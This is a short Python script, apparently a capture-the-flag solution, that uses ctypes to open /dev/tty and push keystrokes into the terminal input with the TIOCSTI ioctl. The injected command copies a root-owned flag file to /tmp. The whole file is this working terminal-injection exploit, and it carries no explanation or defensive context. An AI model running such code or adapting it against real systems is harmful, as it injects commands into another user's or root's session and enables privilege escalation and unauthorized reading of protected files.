import ctypes

libc = ctypes.CDLL('libc.so.6')
open = libc.open
open.argtypes = [ctypes.c_char_p, ctypes.c_int]
open.restype = ctypes.c_int
fd = open(b'/dev/tty', 2)
print(fd)

ioctl = libc.ioctl
ioctl.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_char_p]
ioctl.restype = ctypes.c_int
TIOCSTI = 0x5412
cmd = '\ncat /root/flag.txt > /tmp/flag.txt\n'
for c in cmd:
    r = ioctl(fd, TIOCSTI, ctypes.c_char_p(c.encode()))
    if r < 0:
        print('ioctl failed')
        break

libc.close(fd)
print('Done')